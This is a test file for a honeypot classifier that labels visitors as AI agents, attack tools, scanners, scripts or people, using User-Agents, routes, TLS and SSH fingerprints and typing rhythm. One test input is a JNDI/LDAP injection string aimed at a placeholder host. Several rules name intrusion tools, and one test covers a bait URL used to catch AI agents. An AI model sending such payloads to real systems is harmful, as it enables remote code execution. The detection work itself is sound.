import { describe, expect, it } from 'vitest';
import { NOMBRE_CLASE, quienEs } from './quien-es';
import { HASSH, JA3, JA4_CIFRADOS, huellaTlsDe, leerJa4 } from './quien-es-huellas';

const de = (agente: string, ruta = '/login') => quienEs({ agente, ruta });

describe('quién hay al otro lado de un evento', () => {
	it('lo que dice el honeypot manda sobre el User-Agent', () => {
		expect(quienEs({ agente_ia: 'confirmed', agente: 'sqlmap/1.8' })).toMatchObject({
			clase: 'ia',
			nombre: 'AI agent'
		});
	});

	it.each([
		[
			'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot',
			'ia',
			'ChatGPT'
		],
		[
			'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)',
			'ia',
			'Anthropic ClaudeBot'
		],
		['Mozilla/5.0 (compatible; PerplexityBot/1.0)', 'ia', 'Perplexity'],
		['sqlmap/1.8.4#stable (https://sqlmap.org)', 'ataque', 'sqlmap'],
		[
			'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
			'ataque',
			'Nmap'
		],
		[
			'Mozilla/5.0 (Nuclei - Open-source project (github.com/projectdiscovery/nuclei))',
			'ataque',
			'Nuclei'
		],
		['Fuzz Faster U Fool v2.1.0', 'ataque', 'ffuf'],
		['${jndi:ldap://x.example/a}', 'ataque', 'Exploit in the User-Agent'],
		['Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'barrido', 'Censys'],
		[
			'Expanse, a Palo Alto Networks company, searches across the global IPv4 space',
			'barrido',
			'Palo Alto Xpanse'
		],
		['curl/8.7.1', 'programa', 'curl'],
		['python-requests/2.32.3', 'programa', 'Python requests'],
		['Go-http-client/1.1', 'programa', 'Go'],
		[
			'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/126.0 Safari/537.36',
			'programa',
			'Automated browser'
		],
		[
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36',
			'navegador',
			'Browser'
		]
	] as const)('%s → %s (%s)', (ua, clase, nombre) => {
		expect(de(ua)).toMatchObject({ clase, nombre });
	});

	it('el User-Agent también llega como user_agent', () => {
		expect(quienEs({ user_agent: 'nikto/2.5.0' })).toMatchObject({
			clase: 'ataque',
			nombre: 'Nikto'
		});
	});

	it('una ruta que solo busca una IA delata aunque el User-Agent sea de navegador', () => {
		const navegador =
			'Mozilla/5.0 (Macintosh) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15';
		expect(de(navegador, '/llms.txt')).toMatchObject({ clase: 'ia', nombre: 'AI agent?' });
		expect(de('', '/.well-known/ai-plugin.json?x=1')).toMatchObject({ clase: 'ia' });
		expect(de(navegador, '/mcp')).toMatchObject({ clase: 'ia' });
		expect(de(navegador, '/mcpanel')?.clase).toBe('navegador');
	});

	it('quien pide la dirección del AGENTS.md cebo es un agente de IA', () => {
		expect(quienEs({ ua: 'curl/8.7.1', path: '/b/abc123/agent-check' })).toMatchObject({
			clase: 'ia',
			nombre: 'AI agent?'
		});
		expect(quienEs({ ua: 'curl/8.7.1', path: '/b/abc123' })).toMatchObject({ clase: 'programa' });
	});

	it('por SSH, el cliente que anuncia', () => {
		expect(quienEs({ version: 'SSH-2.0-paramiko_3.4.0' })).toMatchObject({
			clase: 'programa',
			nombre: 'Python Paramiko'
		});
		expect(quienEs({ version: 'SSH-2.0-Go' })).toMatchObject({ nombre: 'Go' });
		expect(quienEs({ version: 'SSH-2.0-OpenSSH_9.6' })).toMatchObject({ clase: 'navegador' });
		expect(quienEs({ version: 'SSH-2.0-desconocido' })).toBeNull();
		/* Un número de versión de otra cosa no es un cliente SSH. */
		expect(quienEs({ version: '1.2.3' })).toBeNull();
	});

	it('sin nada reconocible, no dice nada', () => {
		expect(quienEs({})).toBeNull();
		expect(quienEs(null)).toBeNull();
		expect(de('algo-que-nadie-conoce/1.0')).toBeNull();
		expect(quienEs({ agente: 42 })).toBeNull();
	});

	it('el motivo no arrastra un User-Agent enorme', () => {
		expect(de('curl/' + 'x'.repeat(5000))!.motivo.length).toBeLessThan(260);
	});
});

/*
 * Paso 4: las huellas que no se cambian con una línea. Los valores son los que
 * dieron los clientes de verdad (quien-es-huellas.ts dice cuáles).
 */
const CHROME =
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36';
const FIREFOX = 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0';
const SAFARI =
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15';
/* Lo que saluda cada uno, a una IP (sin nombre de servidor), como llega casi todo a un honeypot. */
const JA4_CHROME = 't13i1515h2_8daaf6152771_d8a2da3f94cd';
const JA4_FIREFOX = 't13i1716h2_5b57614c22b0_3cbfd9057e0d';
const JA4_APPLE = 't13d2014h2_a09f3c656075_e42f34c56612';
const JA4_PYTHON = 't13i1712h1_ab0a1bf427ad_8537cf56674e'; /* requests */
const JA4_GO = 't13i1311h2_f57a46bbacb6_f50d94e863eb';
const JA4_CURL = 't13i3011h2_1d37bd780c83_882d495ac381';
const JA4_NODE = 't13i5211h1_b262b3658495_8e6e362c5eac';

describe('la huella TLS (JA4, JA3)', () => {
	it('lee las partes de una huella JA4', () => {
		expect(leerJa4('t13d1516h2_8daaf6152771_e5627efa2ab1')).toEqual({
			version: 13,
			sni: true,
			cifrados: 15,
			extensiones: 16,
			alpn: 'h2',
			b: '8daaf6152771',
			c: 'e5627efa2ab1'
		});
		expect(leerJa4('t12i060100_eca7c5d91837_338aad02a631')).toMatchObject({
			version: 12,
			sni: false,
			alpn: '00'
		});
		expect(leerJa4('t00i640000_e7b476f9520b_000000000000')?.version).toBeNull();
		for (const no of ['', 'x', 't13d1516h2', 't13d1516h2_8DAAF6152771_e5627efa2ab1', JA4_GO + 'x'])
			expect(leerJa4(no)).toBeNull();
	});

	it('reconoce de quién es un saludo por sus cifrados, cambie lo que cambie lo demás', () => {
		expect(huellaTlsDe(JA4_PYTHON, '')?.familia).toBe('python');
		/* Otro ALPN, otro número de extensiones, con nombre de servidor: sigue siendo Python. */
		expect(huellaTlsDe('t13d171100_ab0a1bf427ad_8e6e362c5eac', '')?.familia).toBe('python');
		expect(huellaTlsDe(JA4_CHROME, '')?.familia).toBe('chromium');
		expect(huellaTlsDe(JA4_FIREFOX, '')?.familia).toBe('firefox');
		expect(huellaTlsDe(JA4_APPLE, '')?.familia).toBe('apple');
		expect(huellaTlsDe(JA4_GO, '')?.familia).toBe('go');
		expect(huellaTlsDe(JA4_NODE, '')?.familia).toBe('node');
		expect(huellaTlsDe(JA4_CURL, '')?.familia).toBe('openssl');
		/* La sonda de versiones de Nmap y su guion de cifrados (por las extensiones). */
		expect(huellaTlsDe('t12i060100_eca7c5d91837_338aad02a631', '')?.tipo).toBe('ataque');
		expect(huellaTlsDe('t12d630400_f4a33ce78bd4_8c62700bf2ea', '')?.familia).toBe('nmap');
		expect(huellaTlsDe('t13d1516h2_000000000000_000000000000', '')).toBeNull();
		/* Sin JA4, por JA3. Con JA4, JA3 no se mira. */
		expect(huellaTlsDe('', '84330a279f90d61388a8bfc7cb80535f')?.familia).toBe('python');
		expect(huellaTlsDe('', 'ffffffffffffffffffffffffffffffff')).toBeNull();
		expect(huellaTlsDe(JA4_GO, '84330a279f90d61388a8bfc7cb80535f')?.familia).toBe('go');
	});

	it('las tablas no tienen claves mal escritas', () => {
		for (const b of Object.keys(JA4_CIFRADOS)) expect(b).toMatch(/^[0-9a-f]{12}$/);
		for (const h of [...Object.keys(JA3), ...Object.keys(HASSH)])
			expect(h).toMatch(/^[0-9a-f]{32}$/);
	});

	it('dice ser un navegador y saluda como una biblioteca: la contradicción', () => {
		const q = quienEs({ agente: CHROME, ruta: '/login', ja4: JA4_PYTHON, ja3: 'x' })!;
		expect(q).toMatchObject({ clase: 'programa', nombre: 'Python posing as Chrome' });
		expect(q.motivo).toContain('but its TLS handshake is the one Python produces');
		expect(q.motivo).toContain(`JA4 ${JA4_PYTHON}`);
		expect(q.motivo).toContain('A hint, not proof');
		expect(quienEs({ user_agent: FIREFOX, ja4: JA4_GO })).toMatchObject({
			clase: 'programa',
			nombre: 'Go posing as Firefox'
		});
		expect(quienEs({ agente: SAFARI, ja4: JA4_CURL })).toMatchObject({
			clase: 'programa',
			nombre: 'OpenSSL (curl, Wget, PHP, Ruby, Perl) posing as Safari'
		});
		/* Con la sonda de Nmap, además es una herramienta de ataque. */
		expect(quienEs({ agente: CHROME, ja4: 't12i060100_eca7c5d91837_338aad02a631' })).toMatchObject({
			clase: 'ataque',
			nombre: 'Nmap posing as Chrome'
		});
		/* Solo con JA3. */
		expect(quienEs({ agente: CHROME, ja3: '60828da5b42313d165aae2938e651b72' })).toMatchObject({
			clase: 'programa',
			nombre: 'Go posing as Chrome'
		});
	});

	it('un navegador que saluda como otro navegador tampoco casa', () => {
		expect(quienEs({ agente: FIREFOX, ja4: JA4_CHROME })).toMatchObject({
			clase: 'programa',
			nombre: 'Chrome (or another Chromium browser) posing as Firefox'
		});
		/* En un iPhone, Chrome va con la red de Apple: casa. */
		const chromeEnIphone =
			'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/142.0 Mobile/15E148 Safari/604.1';
		expect(quienEs({ agente: chromeEnIphone, ja4: JA4_APPLE })?.clase).toBe('navegador');
	});

	it('un navegador que saluda como su navegador sigue siendo un navegador', () => {
		for (const [ua, ja4] of [
			[CHROME, JA4_CHROME],
			[FIREFOX, JA4_FIREFOX],
			[SAFARI, JA4_APPLE],
			/* Edge es Chromium. */
			[CHROME + ' Edg/142.0.0.0', JA4_CHROME]
		]) {
			const q = quienEs({ agente: ua, ja4 })!;
			expect(q).toMatchObject({ clase: 'navegador', nombre: 'Browser' });
			expect(q.motivo).toContain('its TLS handshake is the one');
		}
	});

	it('sin huella conocida, la primera parte de JA4 ya dice que no es un navegador', () => {
		/* No ofrece HTTP/2 ni ningún ALPN. */
		const sinAlpn = quienEs({ agente: CHROME, ja4: 't13i200900_aaaaaaaaaaaa_bbbbbbbbbbbb' })!;
		expect(sinAlpn).toMatchObject({ clase: 'programa', nombre: 'Script posing as Chrome' });
		expect(sinAlpn.motivo).toContain('does not offer HTTP/2');
		/* Como mucho TLS 1.2. */
		const viejo = quienEs({ agente: FIREFOX, ja4: 't12d2010h2_aaaaaaaaaaaa_bbbbbbbbbbbb' })!;
		expect(viejo).toMatchObject({ clase: 'programa', nombre: 'Script posing as Firefox' });
		expect(viejo.motivo).toContain('TLS 1.2 at most');
		/* Desconocida pero con pinta de navegador: no se inventa nada. */
		expect(quienEs({ agente: CHROME, ja4: 't13d1816h2_aaaaaaaaaaaa_bbbbbbbbbbbb' })).toMatchObject({
			clase: 'navegador',
			motivo: 'It presents itself as a web browser: a person, or a tool posing as one.'
		});
		/* Una huella que no es una huella no cuenta. */
		expect(quienEs({ agente: CHROME, ja4: 'nada', ja3: 'tampoco' })?.clase).toBe('navegador');
	});

	it('una biblioteca que dice su nombre y saluda como ella', () => {
		const q = quienEs({ agente: 'python-requests/2.32.3', ja4: JA4_PYTHON })!;
		expect(q).toMatchObject({ clase: 'programa', nombre: 'Python requests' });
		expect(q.motivo).toContain('Its TLS handshake is the one Python produces');
		/* curl no tiene una sola biblioteca TLS: no se le busca contradicción. */
		expect(quienEs({ agente: 'curl/8.14.1', ja4: JA4_CURL })).toMatchObject({ nombre: 'curl' });
		expect(quienEs({ agente: 'curl/8.14.1', ja4: JA4_GO })).toMatchObject({ nombre: 'curl' });
	});

	it('una biblioteca que dice ser otra', () => {
		expect(quienEs({ agente: 'python-requests/2.32.3', ja4: JA4_GO })).toMatchObject({
			clase: 'programa',
			nombre: 'Go posing as Python requests'
		});
		expect(quienEs({ agente: 'Go-http-client/1.1', ja4: JA4_NODE })).toMatchObject({
			nombre: 'Node.js posing as Go'
		});
		/* Un navegador automatizado que no saluda como un navegador. */
		const sinCabeza =
			'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/142.0.0.0 Safari/537.36';
		expect(quienEs({ agente: sinCabeza, ja4: JA4_CHROME })).toMatchObject({
			nombre: 'Automated browser'
		});
		expect(quienEs({ agente: sinCabeza, ja4: JA4_PYTHON })).toMatchObject({
			nombre: 'Python posing as Automated browser'
		});
	});

	it('lo que ya se sabía por el User-Agent no cambia: la huella se añade al motivo', () => {
		const ia = quienEs({ agente: 'Mozilla/5.0 (compatible; ChatGPT-User/1.0)', ja4: JA4_PYTHON })!;
		expect(ia).toMatchObject({ clase: 'ia', nombre: 'ChatGPT' });
		expect(ia.motivo).toContain('Its TLS handshake is the one Python produces');
		expect(quienEs({ agente: 'sqlmap/1.8', ja4: JA4_PYTHON })).toMatchObject({
			clase: 'ataque',
			nombre: 'sqlmap'
		});
		expect(
			quienEs({ agente: 'Mozilla/5.0 (compatible; CensysInspect/1.1)', ja4: JA4_GO })?.clase
		).toBe('barrido');
		/* Y lo que dice el honeypot sigue mandando. */
		expect(quienEs({ agente_ia: 'suspected', agente: CHROME, ja4: JA4_PYTHON })?.clase).toBe('ia');
	});

	it('sin User-Agent, queda el saludo', () => {
		expect(quienEs({ ja4: JA4_PYTHON })).toMatchObject({ clase: 'programa', nombre: 'Python' });
		expect(quienEs({ ja4: JA4_CHROME })?.clase).toBe('navegador');
		expect(quienEs({ ja4: 't13d1816h2_aaaaaaaaaaaa_bbbbbbbbbbbb' })).toBeNull();
	});
});

describe('la huella de SSH (HASSH) frente a lo que anuncia el cliente', () => {
	const PARAMIKO = 'a2de0f306611e0957be704f5b0e35a82'; /* Paramiko 3.5 y 4.0 */
	const OPENSSH = 'eeca2460550b9ded084ecf2f70a75356'; /* OpenSSH 10.0 */
	const GO = '16443846184eafde36765c9bab2f4397';
	const LIBSSH = '30305c9cfe5e5dea9f7bf2f1e6d500d2'; /* libssh 0.12 */

	it('dice ser OpenSSH y negocia como una biblioteca', () => {
		const q = quienEs({ version: 'SSH-2.0-OpenSSH_9.6', hassh: PARAMIKO })!;
		expect(q).toMatchObject({ clase: 'programa', nombre: 'Python Paramiko posing as OpenSSH' });
		expect(q.motivo).toContain('presents itself as "SSH-2.0-OpenSSH_9.6", but it negotiates');
		expect(q.motivo).toContain(`HASSH ${PARAMIKO}`);
		expect(q.motivo).toContain('A hint, not proof');
		expect(quienEs({ version: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3', hassh: GO })).toMatchObject({
			clase: 'programa',
			nombre: 'Go posing as OpenSSH'
		});
		expect(quienEs({ version: 'SSH-2.0-PuTTY_Release_0.83', hassh: LIBSSH })).toMatchObject({
			nombre: 'libssh posing as PuTTY'
		});
		/* La huella llega en mayúsculas de otra fuente: es la misma. */
		expect(quienEs({ version: 'SSH-2.0-OpenSSH_9.6', hassh: PARAMIKO.toUpperCase() })?.clase).toBe(
			'programa'
		);
	});

	it('Ncrack se anuncia como OpenSSH 7.1 y no negocia como OpenSSH', () => {
		expect(
			quienEs({ version: 'SSH-2.0-OpenSSH_7.1', hassh: '55a77ae9728654f1d4240a29287dc296' })
		).toMatchObject({ clase: 'ataque', nombre: 'Ncrack posing as OpenSSH' });
		/* Los guiones de Nmap dicen su nombre y negocian como ellos. */
		expect(
			quienEs({
				version: 'SSH-2.0-Nmap-SSH2-Hostkey',
				hassh: 'e788c657d1a22971d5026526ffd2e918'
			})
		).toMatchObject({ clase: 'ataque', nombre: 'Nmap' });
	});

	it('una biblioteca que dice ser otra, o un cliente que dice ser una biblioteca', () => {
		expect(quienEs({ version: 'SSH-2.0-Go', hassh: PARAMIKO })).toMatchObject({
			nombre: 'Python Paramiko posing as Go'
		});
		expect(quienEs({ version: 'SSH-2.0-paramiko_3.4.0', hassh: OPENSSH })).toMatchObject({
			clase: 'programa',
			nombre: 'OpenSSH posing as Python Paramiko'
		});
	});

	it('dice lo que es y negocia como lo que dice', () => {
		const q = quienEs({ version: 'SSH-2.0-OpenSSH_10.0', hassh: OPENSSH })!;
		expect(q).toMatchObject({ clase: 'navegador', nombre: 'Interactive SSH client' });
		expect(q.motivo).toContain('and it negotiates encryption the way OpenSSH does');
		expect(quienEs({ version: 'SSH-2.0-paramiko_4.0.0', hassh: PARAMIKO })).toMatchObject({
			clase: 'programa',
			nombre: 'Python Paramiko'
		});
		expect(quienEs({ version: 'SSH-2.0-libssh_0.12.0', hassh: LIBSSH })).toMatchObject({
			clase: 'programa',
			nombre: 'libssh'
		});
	});

	it('sin versión, o con una que no dice nada, queda la huella', () => {
		expect(quienEs({ hassh: PARAMIKO })).toMatchObject({
			clase: 'programa',
			nombre: 'Python Paramiko'
		});
		expect(quienEs({ hassh: OPENSSH })).toMatchObject({
			clase: 'navegador',
			nombre: 'Interactive SSH client'
		});
		expect(quienEs({ version: 'SSH-2.0-loquesea', hassh: PARAMIKO })).toMatchObject({
			clase: 'programa',
			nombre: 'Python Paramiko'
		});
		/* Medusa anuncia su nombre y negocia con libssh2: casa, y sigue siendo de ataque. */
		expect(
			quienEs({ version: 'SSH-2.0-MEDUSA_1.0', hassh: 'b4b8ae3d7241d2c1dc54b4df7e8c19d1' })
		).toMatchObject({ clase: 'ataque', nombre: 'Password cracker' });
	});

	it('una huella que no se conoce no cambia lo que ya se decía', () => {
		const h = 'f'.repeat(32);
		expect(quienEs({ version: 'SSH-2.0-OpenSSH_9.6', hassh: h })).toEqual(
			quienEs({ version: 'SSH-2.0-OpenSSH_9.6' })
		);
		expect(quienEs({ hassh: h })).toBeNull();
		expect(quienEs({ version: 'SSH-2.0-desconocido', hassh: h })).toBeNull();
		expect(quienEs({ hassh: 'no-es-una-huella' })).toBeNull();
	});
});

describe('el ritmo de una sesión de SSH', () => {
	it('teclas de una en una: una persona', () => {
		const q = quienEs({
			eventid: 'cowrie.session.closed',
			ritmo: 'human',
			ordenes: 4,
			teclas: 61,
			teclas_ms: 165,
			borrados: 3
		})!;
		expect(q).toMatchObject({ clase: 'persona', nombre: 'Person typing' });
		expect(q.motivo).toBe(
			'Keystrokes arrived one at a time, typically 165 ms apart, with 3 corrections: the pace of someone typing by hand. A hint, not proof.'
		);
		expect(NOMBRE_CLASE[q.clase]).toBe('Person');
		expect(quienEs({ ritmo: 'human', teclas_ms: 120, borrados: 1 })!.motivo).toContain(
			'with 1 correction:'
		);
	});

	it('líneas enteras de golpe: pegado o un programa', () => {
		const q = quienEs({ ritmo: 'pasted', ordenes: 3, teclas: 15, teclas_ms: 0, borrados: 0 })!;
		expect(q).toMatchObject({ clase: 'programa', nombre: 'Pasted or scripted input' });
		expect(q.motivo).toBe(
			'Whole lines arrived at once (keystrokes typically 0 ms apart): pasted, or sent by a program. A hint, not proof.'
		);
	});

	it('órdenes seguidas o a intervalos iguales: un programa', () => {
		expect(
			quienEs({ ritmo: 'scripted', ordenes: 5, intervalo_ms: 40, intervalo_desv_ms: 0 })
		).toEqual({
			clase: 'programa',
			nombre: 'Scripted session',
			motivo:
				'5 commands arrived typically 40 ms apart: sent by a program, not typed. A hint, not proof.'
		});
		expect(
			quienEs({ ritmo: 'scripted', ordenes: 5, intervalo_ms: 5000, intervalo_desv_ms: 25 })!.motivo
		).toBe(
			'5 commands arrived at regular intervals of about 5000 ms (±25 ms): sent by a program, not typed. A hint, not proof.'
		);
		expect(quienEs({ ritmo: 'scripted' })!.motivo).toContain(
			'Commands arrived one right after another'
		);
	});

	it('con pocas muestras no dice nada', () => {
		expect(quienEs({ eventid: 'cowrie.session.closed', ritmo: 'unknown', ordenes: 1 })).toBeNull();
		expect(quienEs({ ritmo: 'otra-cosa' })).toBeNull();
		expect(quienEs({ ritmo: 7 })).toBeNull();
	});

	it('el cliente MCP da nombre al agente', () => {
		expect(quienEs({ agente_ia: 'confirmed', cliente_mcp: 'claude-code 2.4.1' })).toMatchObject({
			clase: 'ia',
			nombre: 'claude-code 2.4.1'
		});
		expect(quienEs({ ruta: '/.well-known/ai-catalog.json' })?.clase).toBe('ia');
	});
});
